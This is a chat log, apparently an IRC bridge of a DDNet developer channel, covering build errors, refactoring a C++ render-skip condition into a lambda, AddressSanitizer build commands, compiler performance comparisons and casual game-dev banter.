00:00 < bridge_> <robyt3> Also, if you look into the `CMakeError.log` it says for almost every configure step:
00:00 < bridge_> <robyt3> ```
00:00 < bridge_> <robyt3> error: data does not exist
00:00 < bridge_> <robyt3> em++: error: '/emsdk/upstream/emscripten/tools/file_packager cmTC_83f35.data --from-emcc --preload data' failed (returned 1)
00:00 < bridge_> <robyt3> ```
00:00 < bridge_> <robyt3> Seems like all of the configure checks fail and then it falls back to some defaults, which might explain why it takes so long
01:03 < ws-client> <ChillerDragon> if my dummy and i both spectate different tees do both tees get thier viewer increased?
01:04 < ws-client> <ChillerDragon> isnt that verifirably scam numbers?
01:06 < bridge_> <kebscs> yes, because server doesnt know who owns the dummy
01:07 < ws-client> <ChillerDragon> Today at 18:53 
01:07 < ws-client> <ChillerDragon> @learath2 
01:07 < ws-client> <ChillerDragon> > ChillerDragon you had a teeworlds/ddnet packet decoder somewhere, where?
01:08 < ws-client> <ChillerDragon> web version is at https://twnet.zillyhuhn.com/
01:09 < ws-client> <ChillerDragon> it eats a few formats like python hex strings and C hex arrays or tcpdumps but its backend is twnet_parser which does not support ddnet ex messages so libtw2 wireshark is more feature rich
01:09 < ws-client> <ChillerDragon> if the irc bot is online you can also do !p here but i think it has trouble connecting to irc
01:09 < ws-client> <ChillerDragon> !ping
01:24 < ws-client> <ChillerDragon> @kebscs oh right we should do issue about that
01:24 < ws-client> <ChillerDragon> aaaa #9515
01:24 < ws-client> <ChillerDragon> how to connect to irc?
01:59 < bridge_> <chillerdragon> @teero777 come voice
02:00 < bridge_> <kebscs> :justatest:
02:19 < bridge_> <oxyzo.> discord chiller dragon jumpscare
02:45 < bridge_> <fokkonaut> https://cdn.discordapp.com/attachments/781552659709820958/1359568677271240867/image.png?ex=67f7f480&is=67f6a300&hm=416ba7a17f583aebe56d6be7c99b9dfd15ba941dc56e4db160a55418eb426ec3&
02:45 < bridge_> <fokkonaut> Some Durák anyone? :p
02:49 < bridge_> <Ewan> @jupeyy_keks hows ddnet rs
02:49 < bridge_> <Ewan> u put any time into it lately
03:18 < bridge_> <louis> wow cool
03:18 < bridge_> <louis> when texas hold em?
04:23 < bridge_> <Ewan> wait I didn’t see this
04:23 < bridge_> <Ewan> looks sick
05:42 < bridge_> <headshotnoby> it's been 1 year since i ported ddnet to NDS
05:42 < bridge_> <headshotnoby> https://cdn.discordapp.com/attachments/293493549758939136/1359735315610210457/image-3.png?ex=67f88fb1&is=67f73e31&hm=ad8a7e80d5397b6ea9527613df0cec8efbb115561da9cb1acec5fecd905de39b&
07:02 < bridge_> <Jupstar ✪> Mh too bad that debugging this sounds so hard
07:03 < bridge_> <Jupstar ✪> I'm working on the editor
07:03 < bridge_> <Jupstar ✪> Is it the most selling game for nds already?
07:21 < bridge_> <teero777> ....
07:21 < bridge_> <teero777> Man
07:40 < bridge_> <headshotnoby> sold more than mario kart ds
07:40 < bridge_> <headshotnoby> :troll:
08:20 < bridge_> <ryozuki> morning
08:55 < bridge_> <Assa> good morning!
08:56 < bridge_> <Assa> would this be readable code to you?:
08:56 < bridge_> <Assa> ```
08:56 < bridge_> <Assa> switch(LayerType):
08:56 < bridge_> <Assa> {
08:56 < bridge_> <Assa> ...
08:56 < bridge_> <Assa>     case LAYER_GAME:
08:56 < bridge_> <Assa>         RenderKillTileBorder(TileLayerCounter - 1, Color.Multiply(GetDeathBorderColor()));
08:56 < bridge_> <Assa>     case LAYER_FRONT:
08:56 < bridge_> <Assa>     case LAYER_TUNE:
08:56 < bridge_> <Assa>     default:
08:56 < bridge_> <Assa>         RenderTileLayer(TileLayerCounter - 1, Color);
08:56 < bridge_> <Assa>         break;
08:56 < bridge_> <Assa>     }
08:56 < bridge_> <Assa> }
08:56 < bridge_> <Assa> ```
08:59 < bridge_> <Assa> wait you can render to the same layer index 🤔
09:40 < bridge_> <jxsl13> sick
09:43 < bridge_> <Assa> @robyt3 something is broken in master, I currently can't connect to LAN servers, the IP is scuffed:
09:43 < bridge_> <Assa> most certainly any maplayer changes didn't cause this
09:43 < bridge_> <Assa> https://cdn.discordapp.com/attachments/293493549758939136/1359796002948911104/screenshot_2025-04-10_09-42-46.png?ex=67f8c836&is=67f776b6&hm=ad7bdfb5193bb77179da7dfa90dd62eb330a733b85b81ad6961af7ff34b60928&
09:44 < bridge_> <Assa> most certainly no maplayer changes caused this
09:44 < bridge_> <Assa> https://cdn.discordapp.com/attachments/293493549758939136/1359796002948911104/screenshot_2025-04-10_09-42-46.png?ex=67f8c836&is=67f776b6&hm=ad7bdfb5193bb77179da7dfa90dd62eb330a733b85b81ad6961af7ff34b60928&
09:48 < bridge_> <Assa> @robyt3 something is broken in master, I currently can't connect by clicking to LAN servers, the IP is scuffed:
09:51 < bridge_> <Assa> A wild guess, but it's probably coming from #10044
09:51 < bridge_> <DDNet> https://github.com/ddnet/ddnet/pull/10044
09:52 < bridge_> <Assa> ```
09:52 < bridge_> <Assa> net_addr_str(&pAddrs[i], aIpAddr, sizeof(aIpAddr), true);
09:52 < bridge_> <Assa> str_append(pBuffer, aIpAddr, BufferSize);
09:52 < bridge_> <Assa> ```
10:50 < bridge_> <milkeeycat> @learath2 I'm thinking about how to lower globals. The problem is that there can be cycles, for example:
10:50 < bridge_> <milkeeycat> ```rust
10:50 < bridge_> <milkeeycat> const A: usize = B;
10:50 < bridge_> <milkeeycat> const B: usize = A;
10:50 < bridge_> <milkeeycat> ```
10:50 < bridge_> <milkeeycat> I've come up with dis:
10:50 < bridge_> <milkeeycat> ```rust
10:50 < bridge_> <milkeeycat> let mut variables: Vec<&Variable> = ...;
10:50 < bridge_> <milkeeycat> 
10:50 < bridge_> <milkeeycat> loop {
10:50 < bridge_> <milkeeycat>     let mut progress = false;
10:50 < bridge_> <milkeeycat> 
10:50 < bridge_> <milkeeycat>     variables.retain(|variable| {
10:50 < bridge_> <milkeeycat>         if can_be_processed(variable) {
10:50 < bridge_> <milkeeycat>             ...
10:50 < bridge_> <milkeeycat>             progress = true;
10:50 < bridge_> <milkeeycat> 
10:50 < bridge_> <milkeeycat>             false
10:50 < bridge_> <milkeeycat>         } else {
10:50 < bridge_> <milkeeycat>             true
10:50 < bridge_> <milkeeycat>         }
10:50 < bridge_> <milkeeycat>     });
10:50 < bridge_> <milkeeycat> 
10:51 < bridge_> <milkeeycat>     if !progress {
10:51 < bridge_> <milkeeycat>         break
10:51 < bridge_> <milkeeycat>     }
10:51 < bridge_> <milkeeycat> }
10:51 < bridge_> <milkeeycat> 
10:51 < bridge_> <milkeeycat> if !variables.empty() {
10:51 < bridge_> <milkeeycat>     panic!("Polundra!!!!");
10:51 < bridge_> <milkeeycat> }
10:52 < bridge_> <learath2> Don't allow cycles?
10:54 < bridge_> <milkeeycat> They are not allowed
10:55 < bridge_> <learath2> Then why does this need any special handling? Didn't you already solve this problem for normal scoped variables?
10:57 < bridge_> <milkeeycat> I rewrote ir and symbol table stuff and now some things are broken
10:58 < bridge_> <milkeeycat> Globals are different because
10:58 < bridge_> <milkeeycat> ```rust
10:58 < bridge_> <milkeeycat> const A: usize = B;
10:58 < bridge_> <milkeeycat> const B: usize = 0x45;
10:58 < bridge_> <milkeeycat> ```
10:58 < bridge_> <milkeeycat> is a valid code
10:59 < bridge_> <learath2> Fwiw, I wouldn't allow that just to make it easy to parse
11:01 < bridge_> <learath2> I guess what you wrote is fine. It is technically guaranteed that you can solve this sort of thing in 2 passes, that's what I would do, order the globals first such that dependents are after what they depend on
11:04 < bridge_> <milkeeycat> Btw I'm thinking about adding a new keyword for declaring globals
11:04 < bridge_> <learath2> Why waste a keyword for what is obvious from position?
11:05 < bridge_> <learath2> It'd only be worth if you are planning on something like php
11:08 < bridge_> <milkeeycat> It will be interesting to see how different the assembly will be when it's generated using codegen in my compiler repo vs compiler backend
11:32 < bridge_> <Assa> has anybody a better idea for this data structure in a loop?
11:32 < bridge_> <Assa> ```
11:32 < bridge_> <Assa>             // stop rendering if we render background but reach the foreground
11:32 < bridge_> <Assa>             if(PassedGameLayer && (m_Type == TYPE_BACKGROUND || m_Type == TYPE_BACKGROUND_FORCE))
11:32 < bridge_> <Assa>                 return;
11:32 < bridge_> <Assa> 
11:32 < bridge_> <Assa>             // skip rendering if we render foreground but are in background
11:32 < bridge_> <Assa>             if(!PassedGameLayer && m_Type == TYPE_FOREGROUND)
11:32 < bridge_> <Assa>                 continue;
11:32 < bridge_> <Assa> 
11:32 < bridge_> <Assa>             // skip rendering if we render background force, but deactivated tile layer and want to render a tilelayer
11:32 < bridge_> <Assa>             if((pLayer->m_Type == LAYERTYPE_TILES && !g_Config.m_ClBackgroundShowTilesLayers) && m_Type == TYPE_BACKGROUND_FORCE)
11:32 < bridge_> <Assa>                 continue;
11:32 < bridge_> <Assa> 
11:32 < bridge_> <Assa>             // skip rendering if we render background but encounter an entity, e.g. speed layer infront of game layer or similar
11:32 < bridge_> <Assa>             if(m_Type == TYPE_BACKGROUND_FORCE && IsEntityLayer)
11:32 < bridge_> <Assa>                 continue;
11:32 < bridge_> <Assa> 
11:32 < bridge_> <Assa>             // skip rendering entities if we want to render everything in it's full glory
11:32 < bridge_> <Assa>             if(m_Type == TYPE_FULL_DESIGN && IsEntityLayer)
11:32 < bridge_> <Assa>                 continue;
11:32 < bridge_> <Assa> 
11:32 < bridge_> <Assa>             int EntityOverlayVal = g_Config.m_ClOverlayEntities;
11:32 < bridge_> <Assa>             // Hide Entities
11:32 < bridge_> <Assa>             if(m_Type == TYPE_FULL_DESIGN)
11:32 < bridge_> <Assa>                 EntityOverlayVal = 0;
11:32 < bridge_> <Assa> 
11:33 < bridge_> <Assa>             // skip rendering anything but entities if we only want to render entities
11:33 < bridge_> <Assa>             if(!IsEntityLayer && EntityOverlayVal == 100 && m_Type != TYPE_BACKGROUND_FORCE) // only show entities
11:33 < bridge_> <Assa>                 continue;
11:33 < bridge_> <Assa> ```
11:33 < bridge_> <Assa> Yes I can chain them all into 1 if case with OR
11:33 < bridge_> <Assa> Yes I can chain them all into 1 if case with OR, doesn't make it any readable
11:36 < bridge_> <Solly (bun bun)> @essigautomat there seems to be alot of dependencies, you could try to get rid of them
11:36 < bridge_> <Solly (bun bun)> (eg EntityOverlayVal = 0; effects the next condition)
11:37 < bridge_> <Assa> yes I sorted them, as we want to exit as early as possible
11:37 < bridge_> <Assa> EntityOverlayVal = 0 also affects unskipped code after that
11:38 < bridge_> <Solly (bun bun)> also i do think making it one big if for return and continue
11:38 < bridge_> <Solly (bun bun)> is cleaner than it is now
11:38 < bridge_> <Assa> I asked chatgpt, it suggests adding 2 functions:
11:38 < bridge_> <Assa> if(ShouldStopRendering(PassedGameLayer, m_Type))
11:38 < bridge_> <Assa>     return;
11:38 < bridge_> <Assa> 
11:38 < bridge_> <Assa> if(ShouldSkipRendering(PassedGameLayer, m_Type, pLayer, IsEntityLayer))
11:38 < bridge_> <Assa>     continue;
11:38 < bridge_> <Solly (bun bun)> ehhh
11:38 < bridge_> <Assa> ```
11:38 < bridge_> <Assa> if(ShouldStopRendering(PassedGameLayer, m_Type))
11:38 < bridge_> <Assa>     return;
11:39 < bridge_> <Assa> 
11:39 < bridge_> <Assa> if(ShouldSkipRendering(PassedGameLayer, m_Type, pLayer, IsEntityLayer))
11:39 < bridge_> <Assa>     continue;
11:39 < bridge_> <Assa> ```
11:39 < bridge_> <Solly (bun bun)> you can have the comments before each part
11:39 < bridge_> <Solly (bun bun)> outlining it means you have to jump away to read it
11:39 < bridge_> <Solly (bun bun)> you can maybe use lambdas so you dont have to pass in anything
11:40 < bridge_> <Assa> I don't think, that lambdas make this any cleaner, or moving this into a function, as it still contains the same code
11:40 < bridge_> <Solly (bun bun)> some people (and probably clang tidy) have something to say about huge if statements
11:41 < bridge_> <Solly (bun bun)> clang format does this to if statements and i hate it
11:41 < bridge_> <Solly (bun bun)> 
11:41 < bridge_> <Solly (bun bun)> ```cpp
11:41 < bridge_> <Solly (bun bun)> if(a && b && c
11:41 < bridge_> <Solly (bun bun)>    && d && e
11:41 < bridge_> <Solly (bun bun)>    && f)
11:41 < bridge_> <Solly (bun bun)> ```
11:41 < bridge_> <Solly (bun bun)> it should be
11:41 < bridge_> <Solly (bun bun)> ```cpp
11:41 < bridge_> <Solly (bun bun)> if (
11:41 < bridge_> <Solly (bun bun)>     a && b && c &&
11:41 < bridge_> <Solly (bun bun)>     d && ee &&
11:41 < bridge_> <Solly (bun bun)>     f
11:41 < bridge_> <Solly (bun bun)> )
11:41 < bridge_> <Solly (bun bun)> ```
11:41 < bridge_> <Solly (bun bun)> imo
11:41 < bridge_> <Solly (bun bun)> and also putting comments into there is harder in the first
11:42 < bridge_> <Solly (bun bun)> ```cpp
11:42 < bridge_> <Solly (bun bun)> // comment a && b && c
11:42 < bridge_> <Solly (bun bun)> if(a && b && c
11:42 < bridge_> <Solly (bun bun)>    // comment d && e
11:42 < bridge_> <Solly (bun bun)>    && d && e
11:42 < bridge_> <Solly (bun bun)>    // comment f
11:42 < bridge_> <Solly (bun bun)>    && f)
11:42 < bridge_> <Solly (bun bun)> ```
11:42 < bridge_> <Solly (bun bun)> ```cpp
11:42 < bridge_> <Solly (bun bun)> if (
11:42 < bridge_> <Solly (bun bun)>     // comment a && b && c
11:42 < bridge_> <Solly (bun bun)>     a && b && c &&
11:42 < bridge_> <Solly (bun bun)>     // comment d && e
11:42 < bridge_> <Solly (bun bun)>     d && e &&
11:42 < bridge_> <Solly (bun bun)>     // comment f
11:42 < bridge_> <Solly (bun bun)>     f
11:42 < bridge_> <Solly (bun bun)> )
11:43 < bridge_> <Solly (bun bun)> ```
11:43 < bridge_> <Solly (bun bun)> you dont have to worry about that if you use a func
11:43 < bridge_> <Solly (bun bun)> or lambda
11:43 < bridge_> <Assa> you can make it directly use "return" there but yes
11:43 < bridge_> <Solly (bun bun)> and you can put the lambda really close to the usage so you dont jump away that far
11:43 < bridge_> <Solly (bun bun)> (could be right next to it)
11:43 < bridge_> <Assa> no, you'd want to put it outside of the loop, which is really far
11:44 < bridge_> <Solly (bun bun)> why
11:44 < bridge_> <Solly (bun bun)> the compiler will make it static
11:44 < bridge_> <Solly (bun bun)> (or you can specify that its static now)
11:45 < bridge_> <Assa> (I didn't know that static lambdas are a thing)
11:46 < bridge_> <Solly (bun bun)> in c you can write function definitions in functions and they are equivilant to static lambdas
11:46 < bridge_> <Solly (bun bun)> (that they are scoped functions which know about the scoped variables)
11:47 < bridge_> <Solly (bun bun)> (theres not actually anything stopping functions anywhere from reading the stack like a static lambda)
11:48 < bridge_> <Solly (bun bun)> (eh... its like passing a reference but its always the same offset in the stack)
11:48 < bridge_> <Solly (bun bun)> (im waffling out my ass)
11:48 < bridge_> <Solly (bun bun)> most lambdas can be static
11:48 < bridge_> <Solly (bun bun)> the functions in functions is a gcc extension
11:49 < bridge_> <learath2> I was just about to say that's non-standard
11:50 < bridge_> <Solly (bun bun)> yeah but its bloody useful
11:50 < bridge_> <Solly (bun bun)> wait you can also have non static functions in functions
11:50 < bridge_> <Solly (bun bun)> they are just c lambdas
11:50 < bridge_> <Solly (bun bun)> the compiler will complain about them since it requires making the stack executable (which is a vulnrability)
11:57 < bridge_> <Assa> uhh
11:57 < bridge_> <Assa> ```
11:57 < bridge_> <Assa>             static auto SkipRendering = [this, &PassedGameLayer, &pLayer, &IsEntityLayer, &EntityOverlayVal]() -> bool {
11:57 < bridge_> <Assa>                 return (
11:57 < bridge_> <Assa>                     // skip rendering if we render foreground but are in background
11:57 < bridge_> <Assa>                     (!PassedGameLayer && m_Type == TYPE_FOREGROUND) ||
11:57 < bridge_> <Assa> 
11:57 < bridge_> <Assa>                     // skip rendering if we render background force, but deactivated tile layer and want to render a tilelayer
11:58 < bridge_> <Assa>                     ((pLayer->m_Type == LAYERTYPE_TILES && !g_Config.m_ClBackgroundShowTilesLayers) && m_Type == TYPE_BACKGROUND_FORCE) ||
11:58 < bridge_> <Assa> 
11:58 < bridge_> <Assa>                     // skip rendering if we render background but encounter an entity, e.g. speed layer infront of game layer or similar
11:58 < bridge_> <Assa>                     (m_Type == TYPE_BACKGROUND_FORCE && IsEntityLayer) ||
11:58 < bridge_> <Assa> 
11:58 < bridge_> <Assa>                     // skip rendering entities if we want to render everything in it's full glory
11:58 < bridge_> <Assa>                     (m_Type == TYPE_FULL_DESIGN && IsEntityLayer) ||
11:58 < bridge_> <Assa> 
11:58 < bridge_> <Assa>                     // skip rendering anything but entities if we only want to render entities
11:58 < bridge_> <Assa>                     (!IsEntityLayer && EntityOverlayVal == 100 && m_Type != TYPE_BACKGROUND_FORCE) // only show entities
11:58 < bridge_> <Assa>                 );
11:58 < bridge_> <Assa>             };
11:58 < bridge_> <Assa> 
11:58 < bridge_> <Assa>             if(SkipRendering())
11:58 < bridge_> <Assa>                 continue;
11:58 < bridge_> <Assa> ```
11:58 < bridge_> <Assa> 
11:58 < bridge_> <Assa> `Segmentation fault` hmm
11:58 < bridge_> <Solly (bun bun)> but cpp doesnt complain, maybe theres a way to do non static lambdas without having an executable stack (ie copying the function)
11:58 < bridge_> <Solly (bun bun)> cant you just do [&] and it will capture verything it needs, and since your in a function you can seperate it out into if statemetns again
11:58 < bridge_> <Solly (bun bun)> also use libasan c:
11:59 < bridge_> <Assa> probably not possible to use it directly out of the ddnet project? :/
11:59 < bridge_> <Solly (bun bun)> very possible
12:00 < bridge_> <Solly (bun bun)> its on the readme on how to use it
12:00 < bridge_> <Solly (bun bun)> ill writ ethe commands i use
12:01 < bridge_> <Solly (bun bun)> ```cpp
12:01 < bridge_> <Solly (bun bun)> CC=clang CXX=clang++ CXXFLAGS="-fsanitize=address,undefined -fsanitize-recover=all -fno-omit-frame-pointer" CFLAGS="-fsanitize=address,undefined -fsanitize-recover=all -fno-omit-frame-pointer" cmake -DCMAKE_BUILD_TYPE=Debug .. -GNinja
12:01 < bridge_> <Solly (bun bun)> cmake --build .
12:01 < bridge_> <Solly (bun bun)> UBSAN_OPTIONS=print_stacktrace=1:halt_on_errors=0 ASAN_OPTIONS=print_stacktrace=1:check_initialization_order=1:detect_leaks=1:halt_on_errors=0 ./DDNet
12:01 < bridge_> <Solly (bun bun)> ```
12:01 < bridge_> <Jupstar ✪> Do you not test with asan?
12:02 < bridge_> <Assa> I am happy to be able to compile in the first place on this windows machine
12:03 < bridge_> <learath2> You can have asan on windows nowadays but iirc it was annoying
12:04 < bridge_> <Jupstar ✪> Just use WSL
12:07 < bridge_> <melon> Or msys2
12:08 < bridge_> <totar> msvc has asan
12:08 < bridge_> <melon> :pog:
12:08 < bridge_> <totar> https://learn.microsoft.com/en-us/cpp/sanitizers/asan?view=msvc-170
12:10 < bridge_> <Assa> @sollybunny adding an argument for everything and not adding to the lambda reference list works
12:10 < bridge_> <Assa> might be an issue with static lambdas and references I guess
12:11 < bridge_> <learath2> Copy everything 😄
12:12 < bridge_> <Assa> it boils down to `(int m_Type, bool PassedGameLayer, int LayerType, bool IsEntityLayer, int EntityOverlayVal)` anyway
12:12 < bridge_> <Assa> references are not that useful here anyway xD
12:15 < bridge_> <Assa> are you happy with this?
12:15 < bridge_> <Assa> ```
12:15 < bridge_> <Assa>             static auto SkipRendering = [](int RenderType, bool PassedGameLayer, int ItemLayerType, bool IsEntityLayer, int EntityOverlayVal) -> bool {
12:15 < bridge_> <Assa>                 return (
12:15 < bridge_> <Assa>                     // skip rendering if we render foreground but are in background
12:15 < bridge_> <Assa>                     (!PassedGameLayer && RenderType == TYPE_FOREGROUND) ||
12:15 < bridge_> <Assa> 
12:15 < bridge_> <Assa>                     // skip rendering if we render background force, but deactivated tile layer and want to render a tilelayer
12:15 < bridge_> <Assa>                     ((ItemLayerType == LAYERTYPE_TILES && !g_Config.m_ClBackgroundShowTilesLayers) && RenderType == TYPE_BACKGROUND_FORCE) ||
12:15 < bridge_> <Assa> 
12:15 < bridge_> <Assa>                     // skip rendering if we render background but encounter an entity, e.g. speed layer infront of game layer or similar
12:15 < bridge_> <Assa>                     (RenderType == TYPE_BACKGROUND_FORCE && IsEntityLayer) ||
12:15 < bridge_> <Assa> 
12:15 < bridge_> <Assa>                     // skip rendering entities if we want to render everything in it's full glory
12:15 < bridge_> <Assa>                     (RenderType == TYPE_FULL_DESIGN && IsEntityLayer) ||
12:15 < bridge_> <Assa> 
12:15 < bridge_> <Assa>                     // skip rendering anything but entities if we only want to render entities
12:15 < bridge_> <Assa>                     (!IsEntityLayer && EntityOverlayVal == 100 && RenderType != TYPE_BACKGROUND_FORCE) // only show entities
12:15 < bridge_> <Assa>                 );
12:15 < bridge_> <Assa>             };
12:15 < bridge_> <Assa> 
12:15 < bridge_> <Assa>             if(SkipRendering(m_Type, PassedGameLayer, pLayer->m_Type, IsEntityLayer, EntityOverlayVal))
12:15 < bridge_> <Assa>                 continue;
12:15 < bridge_> <Assa> ```
12:15 < bridge_> <Assa> are you happy with this?
12:15 < bridge_> <Assa> ```C++
12:15 < bridge_> <Assa>             static auto SkipRendering = [](int RenderType, bool PassedGameLayer, int ItemLayerType, bool IsEntityLayer, int EntityOverlayVal) -> bool {
12:16 < bridge_> <Assa>                 return (
12:16 < bridge_> <Assa>                     // skip rendering if we render foreground but are in background
12:16 < bridge_> <Assa>                     (!PassedGameLayer && RenderType == TYPE_FOREGROUND) ||
12:16 < bridge_> <Assa> 
12:16 < bridge_> <Assa>                     // skip rendering if we render background force, but deactivated tile layer and want to render a tilelayer
12:16 < bridge_> <Assa>                     ((ItemLayerType == LAYERTYPE_TILES && !g_Config.m_ClBackgroundShowTilesLayers) && RenderType == TYPE_BACKGROUND_FORCE) ||
12:16 < bridge_> <Assa> 
12:16 < bridge_> <Assa>                     // skip rendering if we render background but encounter an entity, e.g. speed layer infront of game layer or similar
12:16 < bridge_> <Assa>                     (RenderType == TYPE_BACKGROUND_FORCE && IsEntityLayer) ||
12:16 < bridge_> <Assa> 
12:16 < bridge_> <Assa>                     // skip rendering entities if we want to render everything in it's full glory
12:16 < bridge_> <Assa>                     (RenderType == TYPE_FULL_DESIGN && IsEntityLayer) ||
12:16 < bridge_> <Assa> 
12:16 < bridge_> <Assa>                     // skip rendering anything but entities if we only want to render entities
12:16 < bridge_> <Assa>                     (!IsEntityLayer && EntityOverlayVal == 100 && RenderType != TYPE_BACKGROUND_FORCE) // only show entities
12:24 < bridge_> <learath2> I'm not happy that you didn't figure out why you couldn't just capture
12:25 < bridge_> <learath2> But that's just my personal pet peeve. I'm sure you can get this through review
12:26 < bridge_> <Assa> I asked Robyt directly in the PR, as I am certain he has to say something constructive
12:27 < bridge_> <Assa> also I moved the EntitieyOverlayVal completly out of the loops, as it doesn't need to be recalculated for every tilelayer 😄
12:27 < bridge_> <Assa> also I moved the EntitieyOverlayVal completly out of the loop, as it doesn't need to be recalculated for every tilelayer 😄
12:28 < bridge_> <teero777> @chillerdragon when vc again
12:29 < bridge_> <learath2> Fwiw I like it as is too, without the lambda at all. So that's also an option
12:32 < bridge_> <Assa> I compared fps with 19.1 now and I have less ...
12:32 < bridge_> <Assa> (╯°□°)╯︵ ┻━┻
12:32 < bridge_> <Assa> And I don't think it's about the lambda
12:37 < bridge_> <Jupstar ✪> I am curious how you measure it anyway.
12:37 < bridge_> <Jupstar ✪> I doubt you can even create a CPU bottleneck on a laptop
12:38 < bridge_> <Assa> comparing to the latest master shows no difference to my branch, so it might be one of my previous changes
12:39 < bridge_> <Assa> I am comparing over cpu heavy map parts with a lot of animations, in an empty map my benchmarks get useless
12:43 < bridge_> <Solly (bun bun)> On DDNet?
12:43 < bridge_> <Solly (bun bun)> CPU is definitely the bottleneck
12:43 < bridge_> <Jupstar ✪> And how if you look at a part full of animations, should the lambda even pop up?
12:43 < bridge_> <Jupstar ✪> But not on a laptop
12:43 < bridge_> <Solly (bun bun)> Ehhh
12:44 < bridge_> <Solly (bun bun)> Depends what laptop
12:44 < bridge_> <Assa> Okay, checking out tag 19.1, building it myself and comparing leads to different results
12:44 < bridge_> <Solly (bun bun)> But the graphics that DDNet is doing is... Not alot
12:44 < bridge_> <Jupstar ✪> Do you want to tell me there is any modern CPU that cannot calculate ddnet more than 700 times per second?
12:44 < bridge_> <Solly (bun bun)> Or I guess there's lots of immediate mode graphics
12:44 < bridge_> <Jupstar ✪> I mean with 64p or smth ok
12:44 < bridge_> <Assa> so I actually improve FPS comparing like this, but compared to the ddnet download of 19.1 I have, I have less fps
12:44 < bridge_> <ryozuki> @jupeyy_keks did u try wasm with cpp, also what runtime do u uuse? wasmer?
12:45 < bridge_> <Jupstar ✪> I did not. Yes wasmer
12:45 < bridge_> <ryozuki> wasmer has cpp header iirc
12:45 < bridge_> <ryozuki> i thought about trying ur plugable physics in the ddnet code inspired by ur ddnet rs
12:45 < bridge_> <ryozuki> breaking protocol ofc
12:45 < bridge_> <ryozuki> i thought about trying to impl ur plugable physics in the ddnet code inspired by ur ddnet rs
12:46 < bridge_> <Jupstar ✪> The reason why I like Rust here is simply proc macros.
12:46 < bridge_> <Jupstar ✪> 
12:46 < bridge_> <Jupstar ✪> They automatically implement the whole wasm bridge and for you as dev it feels like you simply implemented Rust <-> Rust trait
12:46 < bridge_> <Jupstar ✪> You don't even see the wasm details
12:46 < bridge_> <ryozuki> hmm
12:46 < bridge_> <ryozuki> maybe make the interaction with wasm in rust
12:46 < bridge_> <ryozuki> and a interface to manage this from cpp from exisiting code idk
12:46 < bridge_> <ryozuki> or just contribute to ddnet rs
12:47 < bridge_> <ryozuki> idk what to do
12:47 < bridge_> <ryozuki> i was just bored and thought why not
12:47 < bridge_> <Jupstar ✪> xd
12:47 < bridge_> <Jupstar ✪> 
12:47 < bridge_> <Jupstar ✪> write legacy bridge
12:47 < bridge_> <ryozuki> xd
12:47 < bridge_> <ryozuki> when quic
12:47 < bridge_> <ryozuki> cpp quic
12:48 < bridge_> <Jupstar ✪> yeah go go go
12:48 < bridge_> <ryozuki> we so close and so far from accounts
12:48 < bridge_> <Jupstar ✪> You have all my mental support for that
12:48 < bridge_> <ryozuki> xd
12:48 < bridge_> <ryozuki> i got the whole week off next week
12:49 < bridge_> <Jupstar ✪> I mean you could write a QUIC impl in 1 week.
12:49 < bridge_> <Jupstar ✪> If you go serious mode
12:49 < bridge_> <Jupstar ✪> In worst case you could simply write a wrapper around our UDP impl
12:51 < bridge_> <ryozuki> but isnt there heinrich work
12:51 < bridge_> <ryozuki> i meant that
12:51 < bridge_> <Jupstar ✪> You can also try to get his work ready
12:56 < bridge_> <ryozuki> @jupeyy_keks saw this in hn https://spacetimedb.com/
12:58 < bridge_> <Jupstar ✪> funny, but yeah. cheating, spamming, griefing guaranteed xd
12:59 < bridge_> <ryozuki> wot
12:59 < bridge_> <ryozuki> xd
13:00 < bridge_> <Jupstar ✪> without a server instance there is basically nothing holding the clients back to write whatever gamestate they want
13:19 < bridge_> <Solly (bun bun)> most p2p things have a host still which is running the "server"?
13:19 < bridge_> <Solly (bun bun)> the server can still check for cheating
13:19 < bridge_> <Solly (bun bun)> and for games with demos you can then verify them afterwards
13:19 < bridge_> <Solly (bun bun)> (eg forts)
13:21 < bridge_> <Jupstar ✪> I dunno, I don't believe in their concept xD
13:21 < bridge_> <Assa> I have a question, might be stupid: Why is building myself in release mode slower, then the download from ddnet? AFAIK it's the same config
13:21 < bridge_> <Solly (bun bun)> having easy no setup p2p is very good for non competative things
13:22 < bridge_> <Jupstar ✪> Do you compile with gcc?
13:22 < bridge_> <Solly (bun bun)> +1 my builds are slower
13:22 < bridge_> <Jupstar ✪> Yeah but it's like with many frameworks. It sounds easy until you notice it's hard to work around certain aspects
13:22 < bridge_> <Solly (bun bun)> for the things i often want p2p for, literally just having what they show on their main page is enough
13:23 < bridge_> <Assa> do you use gcc for windows? I mean mingw probably right?
13:23 < bridge_> <Solly (bun bun)> (except i dont use rust)
13:23 < bridge_> <Jupstar ✪> yes mingw
13:23 < bridge_> <Jupstar ✪> ddnet compile with gcc. msvc could potentially produce worse production code
13:23 < bridge_> <Assa> lol mingw is faster then their ms own compiler xD
13:23 < bridge_> <Solly (bun bun)> lmao their title with the rewriting thing only has "game" and "app"
13:23 < bridge_> <Jupstar ✪> i mean it's gcc
13:24 < bridge_> <Jupstar ✪> gcc and clang are far more used if you include server applications etc
13:24 < bridge_> <Solly (bun bun)> how does clang compile faster than gcc, clang is thicker right?
13:24 < bridge_> <Assa> lol mingw is faster then ms own compiler xD
13:24 < bridge_> <Jupstar ✪> i think he means runtime performance anyway
13:24 < bridge_> <totar> there is a server instance?
13:24 < bridge_> <Solly (bun bun)> clang wins because its thicker
13:24 < bridge_> <totar> I thought spacetime db is basically just relation database as world state
13:24 < bridge_> <Jupstar ✪> generally both are probs pretty equal
13:25 < bridge_> <Solly (bun bun)> clang wins because its thicker (has more layers, each of which was built from the ground up)
13:25 < bridge_> <Solly (bun bun)> https://stackoverflow.com/questions/33358488/why-does-clang-produce-a-much-faster-code-than-gcc-for-this-simple-function-invo
13:25 < bridge_> <Solly (bun bun)> clang can spot more things
13:25 < bridge_> <Solly (bun bun)> for most purposes it doesnt matter
13:25 < bridge_> <Jupstar ✪> it sounds to me more that they allow server code but don't want a runtime in a classical sense, with e.g. having ticks etc.
13:25 < bridge_> <Jupstar ✪> else i don't understand their whole concept anyway
13:26 < bridge_> <Solly (bun bun)> clang can spot more things (sample size 1)
13:26 < bridge_> <Jupstar ✪> clang uses vectorizing in O2.. that is the main reason it's faster
13:26 < bridge_> <Jupstar ✪> gcc only activates it on O3
13:26 < bridge_> <totar> no I think it's just a relational database optimized for game servers
13:26 < bridge_> <totar> you still have a regular server that calculates all the physics
13:26 < bridge_> <Solly (bun bun)> -O4 go brrr
13:26 < bridge_> <Solly (bun bun)> (ik o4 does nothing)
13:26 < bridge_> <Jupstar ✪> I mean their description says the clients connect to the database directly (somehow)
